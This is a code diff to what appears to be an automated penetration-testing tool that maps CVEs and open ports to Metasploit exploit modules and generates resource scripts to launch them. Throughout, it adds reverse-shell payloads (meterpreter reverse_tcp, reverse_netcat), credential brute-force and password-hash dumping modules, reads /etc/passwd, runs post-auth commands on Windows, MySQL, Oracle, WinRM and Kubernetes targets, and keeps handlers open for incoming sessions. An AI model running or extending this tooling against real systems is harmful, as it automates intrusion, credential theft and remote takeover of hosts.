@@ -372,7 +372,7 @@ CVE_TO_MSF: dict[str, dict] = {
     # ── Apache Tomcat ─────────────────────────────────────────────────
     "CVE-2017-12617": {"module": "exploit/multi/http/tomcat_jsp_upload_bypass",    "payload": "java/meterpreter/reverse_tcp"},
     "CVE-2019-0232":  {"module": "exploit/windows/http/tomcat_cgi_cmdlineargs",    "payload": "windows/meterpreter/reverse_tcp"},
-    "CVE-2020-1938":  {"module": "exploit/multi/http/tomcat_ghostcat",             "payload": "java/meterpreter/reverse_tcp"},
+    "CVE-2020-1938":  {"module": "auxiliary/admin/http/tomcat_ghostcat",            "payload": None},
 
     # ── VMware ────────────────────────────────────────────────────────
     "CVE-2021-21985": {"module": "exploit/multi/http/vmware_vsphere_client_rce",   "payload": "linux/x64/meterpreter/reverse_tcp"},
@@ -463,6 +463,7 @@ CVE_TO_MSF: dict[str, dict] = {
     "CVE-2015-1427":  {"module": "exploit/multi/elasticsearch/script_groovy_rce",  "payload": "java/meterpreter/reverse_tcp"},
 
     # ── ProFTPD ──────────────────────────────────────────────────────
+    "CVE-2015-3306":  {"module": "exploit/unix/ftp/proftpd_modcopy_exec",          "payload": "cmd/unix/reverse_netcat"},
     "CVE-2011-4130":  {"module": "exploit/unix/ftp/proftpd_133c_backdoor",         "payload": "cmd/unix/interact"},
     "CVE-2010-4221":  {"module": "exploit/linux/ftp/proftp_telnet_iac",            "payload": "linux/x86/meterpreter/reverse_tcp"},
 
@@ -550,7 +551,8 @@ CVE_TO_MSF: dict[str, dict] = {
     "CVE-2024-6387":  {"module": "exploit/linux/ssh/openssh_regresshion",           "payload": "linux/x64/meterpreter/reverse_tcp"},
 
     # ── Docker daemon API unauthenticated ─────────────────────────
-    "CVE-2019-13139": {"module": "exploit/linux/http/docker_daemon_tcp_rce",        "payload": "linux/x64/meterpreter/reverse_tcp"},
+    # No MSF exploit module for unprotected Docker TCP API — use http_version scanner to fingerprint
+    "CVE-2019-13139": {"module": "auxiliary/scanner/http/http_version",             "payload": None},
 
     # ── MOVEit Transfer (follow-on SQLi CVEs) ─────────────────────
     "CVE-2023-35036": {"module": "exploit/multi/http/moveit_sqli",                  "payload": "windows/x64/meterpreter/reverse_tcp"},
@@ -725,6 +727,9 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "exploit/windows/ftp/ms09_053_ftpd_nlst",
          "p": "windows/meterpreter/reverse_tcp",   "post": True,
          "os": "windows", "ver": "microsoft ftp"},
+        {"m": "exploit/unix/ftp/proftpd_modcopy_exec",
+         "p": "cmd/unix/reverse_netcat",           "post": True,
+         "os": "linux",  "ver": "proftpd"},
     ],
 
     # ── SSH (22) ──────────────────────────────────────────────────────────────
@@ -761,6 +766,14 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/smtp/smtp_enum"},
         {"m": "auxiliary/scanner/smtp/smtp_relay"},
         {"m": "auxiliary/scanner/smtp/smtp_ntlm_domain"},
+        # Exim RCE — CVE-2019-15846 (string format, Exim 4.x)
+        {"m": "exploit/linux/smtp/exim4_string_format",
+         "p": "linux/x86/meterpreter/reverse_tcp",  "post": True,
+         "os": "linux", "ver": "exim 4"},
+        # Exim SPF RCE — CVE-2023-42115
+        {"m": "exploit/linux/smtp/exim_spf_rce",
+         "p": "linux/x64/meterpreter/reverse_tcp",  "post": True,
+         "os": "linux", "ver": "exim"},
     ],
 
     # ── DNS (53) ──────────────────────────────────────────────────────────────
@@ -801,6 +814,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
          "x": {"RPORT": "80", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
          "os": "linux", "ver": "apache"},
+        # Log4Shell detection scanner (before attempting exploit)
+        {"m": "auxiliary/scanner/http/log4shell_scanner",       "x": {"RPORT": "80"}},
+        # Jenkins default credentials brute force
+        {"m": "auxiliary/scanner/http/jenkins_login",           "x": {"RPORT": "80"}, "cred": True},
         # webdav_upload_asp — removed (deprecated, not available in MSF 6.4)
     ],
 
@@ -856,6 +873,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "exploit/multi/http/apache_mod_cgi_bash_env_exec","p": "linux/x86/meterpreter/reverse_tcp",
          "x": {"RPORT": "443", "SSL": "true", "TARGETURI": "/cgi-bin/test.cgi"}, "post": True,
          "os": "linux", "ver": "apache"},
+        # Log4Shell detection scanner (before attempting exploit)
+        {"m": "auxiliary/scanner/http/log4shell_scanner",       "x": {"RPORT": "443", "SSL": "true"}},
+        # Jenkins default credentials brute force
+        {"m": "auxiliary/scanner/http/jenkins_login",           "x": {"RPORT": "443", "SSL": "true"}, "cred": True},
     ],
 
     # ── MSRPC/DCOM (135) ─────────────────────────────────────────────────────
@@ -894,6 +915,12 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
          "p": "linux/x86/meterpreter/reverse_tcp",   "post": True, "os": "linux"},
         {"m": "exploit/multi/samba/usermap_script",
          "p": "cmd/unix/interact",                   "post": True, "os": "linux"},
+        # GPP password dump from SYSVOL — no auth needed, Windows DC only
+        {"m": "auxiliary/scanner/smb/smb_enum_gpp",                "os": "windows"},
+        # PsExec RCE via valid credentials
+        {"m": "exploit/windows/smb/psexec",
+         "p": "windows/meterpreter/reverse_tcp",     "post": True,
+         "os": "windows", "cred": True, "needs_creds": True},
     ],
 
     # ── Kerberos (88) ─────────────────────────────────────────────────────────
@@ -922,6 +949,8 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
          "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
         {"m": "auxiliary/admin/mssql/mssql_enum_sql_logins",
          "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
+        {"m": "auxiliary/admin/mssql/mssql_findandsampledata",
+         "x": {"USERNAME": "sa", "PASSWORD": ""},        "cred": True, "needs_creds": True},
         {"m": "auxiliary/admin/mssql/mssql_exec",
          "x": {"USERNAME": "sa", "PASSWORD": "", "CMD": "whoami /all"},
          "cred": True, "needs_creds": True},
@@ -938,12 +967,19 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
 
     # ── Oracle DB (1521) ─────────────────────────────────────────────────────
     1521: [
+        # Banner grab TNS listener first (no auth needed)
+        {"m": "auxiliary/scanner/oracle/tnslsnr_version"},
         # Default Oracle creds: system/oracle is the most common misconfiguration
         {"m": "auxiliary/scanner/oracle/oracle_login",
          "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
-        {"m": "auxiliary/scanner/oracle/oracle_sid"},
+        {"m": "auxiliary/scanner/oracle/sid_brute"},
         {"m": "auxiliary/admin/oracle/oracle_enum_users",
          "x": {"USERNAME": "system", "PASSWORD": "oracle"}, "cred": True},
+        # Arbitrary SQL execution post-auth
+        {"m": "auxiliary/admin/oracle/oracle_sql",
+         "x": {"USERNAME": "system", "PASSWORD": "oracle",
+               "SQL": "SELECT username, account_status FROM dba_users"},
+         "cred": True, "needs_creds": True},
         {"m": "exploit/windows/oracle/oracle_dbms_scheduler",
          "x": {"USERNAME": "system", "PASSWORD": "oracle"},
          "p": "windows/meterpreter/reverse_tcp", "cred": True, "post": True,
@@ -965,15 +1001,14 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     ],
 
     # ── Docker API (2375) ─────────────────────────────────────────────────────
+    # No MSF exploit for unprotected Docker TCP API — fingerprint only
     2375: [
-        {"m": "exploit/linux/http/docker_daemon_tcp_rce",      "p": "linux/x64/meterpreter/reverse_tcp",
-         "x": {"RPORT": "2375"},                               "post": True},
+        {"m": "auxiliary/scanner/http/http_version",            "x": {"RPORT": "2375"}},
     ],
 
     # ── Docker API TLS (2376) ─────────────────────────────────────────────────
     2376: [
-        {"m": "exploit/linux/http/docker_daemon_tcp_rce",      "p": "linux/x64/meterpreter/reverse_tcp",
-         "x": {"RPORT": "2376", "SSL": "true"},               "post": True},
+        {"m": "auxiliary/scanner/http/http_version",            "x": {"RPORT": "2376", "SSL": "true"}},
     ],
 
     # ── Grafana / Node.js (3000) ─────────────────────────────────────────────
@@ -989,33 +1024,36 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/mysql/mysql_version"},
         {"m": "auxiliary/scanner/mysql/mysql_login",
          "x": {"USER_AS_PASS": "true", "BLANK_PASSWORDS": "true", "STOP_ON_SUCCESS": "false"}, "cred": True},
-        # mysql_authbypass_hashdump: no creds needed, pure bypass attempt
-        {"m": "auxiliary/scanner/mysql/mysql_authbypass_hashdump"},
-        # Post-auth modules: default to root/"" so MSF required options are satisfied.
-        # CLI --username/--password always override these defaults (see Change 8).
+        # mysql_authbypass_hashdump: pure CVE-2012-2122 bypass, no creds needed.
+        # ver_not: MariaDB is NOT affected by this CVE — skip to avoid wasted time.
+        {"m": "auxiliary/scanner/mysql/mysql_authbypass_hashdump",
+         "ver_not": "mariadb"},
+        # Post-auth modules: require valid credentials (MSF 6.4 rejects empty PASSWORD).
+        # needs_creds: True → only queued when --username is provided via CLI.
+        # CLI --username/--password are injected and override the USERNAME default.
         {"m": "auxiliary/scanner/mysql/mysql_hashdump",
-         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
+         "x": {"USERNAME": "root"},                                "cred": True, "needs_creds": True},
         {"m": "auxiliary/scanner/mysql/mysql_file_enum",
-         "x": {"USERNAME": "root", "PASSWORD": "",
+         "x": {"USERNAME": "root",
                "FILE_LIST": "/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt"},
-         "cred": True},
+         "cred": True, "needs_creds": True},
         {"m": "auxiliary/scanner/mysql/mysql_schemadump",
-         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
+         "x": {"USERNAME": "root"},                                "cred": True, "needs_creds": True},
         {"m": "auxiliary/admin/mysql/mysql_enum",
-         "x": {"USERNAME": "root", "PASSWORD": ""},                "cred": True},
+         "x": {"USERNAME": "root"},                                "cred": True, "needs_creds": True},
         {"m": "auxiliary/admin/mysql/mysql_sql",
-         "x": {"USERNAME": "root", "PASSWORD": "",
+         "x": {"USERNAME": "root",
                "SQL": "SELECT user(), version(), @@datadir, @@global.secure_file_priv"},
-         "cred": True},
-        # OS-split MySQL exploits: UDF = Linux, MOF = Windows
+         "cred": True, "needs_creds": True},
+        # OS-split MySQL exploits: UDF = Linux, MOF = Windows — require valid creds.
         {"m": "exploit/multi/mysql/mysql_udf_payload",
-         "x": {"USERNAME": "root", "PASSWORD": ""},
+         "x": {"USERNAME": "root"},
          "p": "linux/x64/meterpreter/reverse_tcp", "cred": True, "post": True,
-         "os": "linux"},
+         "os": "linux", "needs_creds": True},
         {"m": "exploit/windows/mysql/mysql_mof",
-         "x": {"USERNAME": "root", "PASSWORD": ""},
+         "x": {"USERNAME": "root"},
          "p": "windows/meterpreter/reverse_tcp",   "cred": True, "post": True,
-         "os": "windows"},
+         "os": "windows", "needs_creds": True},
     ],
 
     # ── LDAP Global Catalog (3268/3269) ───────────────────────────────────────
@@ -1026,6 +1064,8 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     3389: [
         {"m": "auxiliary/scanner/rdp/rdp_scanner"},
         {"m": "auxiliary/scanner/rdp/ms12_020_check"},
+        # BlueKeep scanner — check vulnerability before running exploit (avoids crash on non-vulnerable)
+        {"m": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",  "os": "windows"},
         {"m": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
          "p": "windows/x64/meterpreter/reverse_tcp", "post": True, "os": "windows"},
         {"m": "exploit/windows/rdp/cve_2019_1182_dejablue",
@@ -1042,6 +1082,11 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
          "x": {"USERNAME": "postgres", "PASSWORD": "",
                "SQL": "SELECT version(), current_user, pg_postmaster_start_time()"},
          "cred": True},
+        # File read on server filesystem — needs valid creds
+        {"m": "auxiliary/admin/postgres/postgres_readfile",
+         "x": {"USERNAME": "postgres", "PASSWORD": "",
+               "RFILE": "/etc/passwd"},
+         "cred": True, "needs_creds": True},
         # CVE-2019-9193: Linux only, needs valid creds
         {"m": "exploit/multi/postgres/postgres_copy_from_program_cmd_exec",
          "x": {"USERNAME": "postgres", "PASSWORD": ""},
@@ -1054,6 +1099,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/winrm/winrm_auth_methods"},
         {"m": "auxiliary/scanner/winrm/winrm_login",           "cred": True,
          "x": {"BLANK_PASSWORDS": "true"}},
+        # Execute command after successful auth
+        {"m": "auxiliary/scanner/winrm/winrm_cmd",
+         "x": {"CMD": "whoami /all && hostname && ipconfig /all"},
+         "cred": True, "needs_creds": True},
         {"m": "exploit/windows/winrm/winrm_script_exec",
          "p": "windows/x64/meterpreter/reverse_tcp",
          "x": {"FORCE_VBS": "true"}, "cred": True, "post": True, "os": "windows"},
@@ -1063,6 +1112,10 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     5986: [
         {"m": "auxiliary/scanner/winrm/winrm_auth_methods",    "x": {"RPORT": "5986", "SSL": "true"}},
         {"m": "auxiliary/scanner/winrm/winrm_login",           "x": {"RPORT": "5986", "SSL": "true"}, "cred": True},
+        # Execute command after successful auth
+        {"m": "auxiliary/scanner/winrm/winrm_cmd",
+         "x": {"RPORT": "5986", "SSL": "true", "CMD": "whoami /all && hostname && ipconfig /all"},
+         "cred": True, "needs_creds": True},
         {"m": "exploit/windows/winrm/winrm_script_exec",
          "p": "windows/x64/meterpreter/reverse_tcp",
          "x": {"RPORT": "5986", "SSL": "true", "FORCE_VBS": "true"},
@@ -1138,12 +1191,16 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
         {"m": "auxiliary/scanner/http/tomcat_enum",            "x": {"RPORT": "8080"}},
         {"m": "auxiliary/scanner/http/jboss_vulnscan",         "x": {"RPORT": "8080"}},
         {"m": "auxiliary/scanner/http/http_login",             "x": {"RPORT": "8080"}, "cred": True},
+        # Log4Shell detection scanner (before attempting exploit)
+        {"m": "auxiliary/scanner/http/log4shell_scanner",      "x": {"RPORT": "8080"}},
+        # Jenkins default credentials brute force
+        {"m": "auxiliary/scanner/http/jenkins_login",          "x": {"RPORT": "8080"}, "cred": True},
         {"m": "exploit/multi/http/tomcat_mgr_upload",          "p": "java/meterpreter/reverse_tcp",
          "x": {"RPORT": "8080"}, "cred": True, "post": True},
         {"m": "exploit/multi/http/tomcat_jsp_upload_bypass",   "p": "java/meterpreter/reverse_tcp",
          "x": {"RPORT": "8080"}, "post": True},
-        {"m": "exploit/multi/http/tomcat_ghostcat",            "p": "java/meterpreter/reverse_tcp",
-         "x": {"RPORT": "8080"}, "post": True},
+        # Ghostcat is a file-read auxiliary (not RCE exploit) — no payload
+        {"m": "auxiliary/admin/http/tomcat_ghostcat",           "x": {"RPORT": "8080"}},
         {"m": "exploit/multi/http/jboss_maindeployer",         "p": "java/meterpreter/reverse_tcp",
          "x": {"RPORT": "8080"}, "post": True},
         {"m": "exploit/multi/http/jboss_invoke_deploy",        "p": "java/meterpreter/reverse_tcp",
@@ -1158,7 +1215,7 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
          "x": {"RPORT": "8080"}, "post": True},
         {"m": "exploit/multi/http/struts2_namespace_ognl",     "p": "linux/x64/meterpreter/reverse_tcp",
          "x": {"RPORT": "8080"}, "post": True},
-        {"m": "exploit/multi/http/log4shell_header_injection",  "p": "java/meterpreter/reverse_tcp",
+        {"m": "exploit/multi/misc/log4shell_header_injection",  "p": "java/meterpreter/reverse_tcp",
          "x": {"RPORT": "8080"}, "post": True},
     ],
 
@@ -1290,6 +1347,9 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
     # ── Kubernetes API (6443) ─────────────────────────────────────────────────
     6443: [
         {"m": "auxiliary/scanner/http/kubernetes_api",         "x": {"RPORT": "6443", "SSL": "true"}},
+        # Pod exec — requires valid credentials/token
+        {"m": "exploit/multi/kubernetes/exec",                 "p": "linux/x64/meterpreter/reverse_tcp",
+         "x": {"RPORT": "6443", "SSL": "true"}, "post": True, "cred": True, "needs_creds": True},
     ],
 
     # ── Cassandra (9042) ─────────────────────────────────────────────────────
@@ -1299,8 +1359,8 @@ PORT_TO_MODULES: dict[int, list[dict]] = {
 
     # ── AJP / Ghostcat (8009) ─────────────────────────────────────────────────
     8009: [
-        {"m": "exploit/multi/http/tomcat_ghostcat",            "p": "java/meterpreter/reverse_tcp",
-         "x": {"RPORT": "8009"}, "post": True},
+        # Ghostcat = auxiliary file-read via AJP, not RCE — no payload
+        {"m": "auxiliary/admin/http/tomcat_ghostcat",           "x": {"RPORT": "8009"}},
     ],
 
     # ── LDAP (port 47001 — Windows RPC-over-HTTP) ────────────────────────────
@@ -1389,7 +1449,9 @@ def build_msf_rc(
         f"set LHOST {lhost}",
         f"set LPORT {lport}",
         "set ExitOnSession false",       # keep handler alive for multiple sessions
-        f"set AutoRunScript multi_console_command -rc {post_rc_path}",
+        # NOTE: AutoRunScript is NOT set here — generic/shell_reverse_tcp does not
+        # support it (MSF warns "Unknown datastore option"). Post-exploit commands
+        # are attached by individual meterpreter exploits via their own AutoRunScript.
         "run -j -z",                     # background and don't interact on new session
         "",
     ]
@@ -1412,7 +1474,10 @@ def build_msf_rc(
             lines.append(f"set AutoRunScript multi_console_command -rc {post_rc_path}")
         if extra:
             for k, v in extra.items():
-                lines.append(f"set {k} {v}")
+                # MSF 6.4 rejects required options (e.g. PASSWORD) when set to
+                # empty string — skip emission and let the module use its default.
+                if v != "":
+                    lines.append(f"set {k} {v}")
         lines.append("run -j")
         lines.append("")
 
@@ -1496,11 +1561,15 @@ def build_msf_rc(
                 if not entry_hosts:
                     continue   # No hosts match required OS — skip this module
 
-            # ── Filter 2: Version/banner match ────────────────────────────────────
+            # ── Filter 2: Version/banner match (positive) ─────────────────────────
             # "ver": "vsftpd 2.3.4" → only run if nmap product for this port
-            # contains the specified substring (case-insensitive)
+            # contains the specified substring (case-insensitive).
+            # If nmap_data is absent we cannot verify — skip version-specific exploits
+            # rather than running them blindly against the wrong service.
             ver_match = entry.get("ver")
-            if ver_match and nmap_data:
+            if ver_match:
+                if not nmap_data:
+                    continue   # No banner data — skip version-specific module
                 entry_hosts = [
                     ip for ip in entry_hosts
                     if ver_match.lower() in
@@ -1508,6 +1577,21 @@ def build_msf_rc(
                 ]
                 if not entry_hosts:
                     continue   # Banner doesn't match — skip version-specific exploit
+
+            # ── Filter 2b: Version/banner exclusion (negative) ────────────────────
+            # "ver_not": "mariadb" → skip if nmap product for this port
+            # contains the excluded string (case-insensitive).
+            # Used to exclude modules that don't work on specific software variants
+            # (e.g. mysql_authbypass_hashdump: CVE-2012-2122 doesn't affect MariaDB).
+            ver_not_match = entry.get("ver_not")
+            if ver_not_match and nmap_data:
+                entry_hosts = [
+                    ip for ip in entry_hosts
+                    if ver_not_match.lower() not in
+                       nmap_data.get(ip, {}).get("products", {}).get(port, "").lower()
+                ]
+                if not entry_hosts:
+                    continue   # All hosts excluded by ver_not filter
 
             # ── Filter 3: Explicit credentials required ───────────────────────────
             # "needs_creds": True → skip module if no --username provided via CLI.
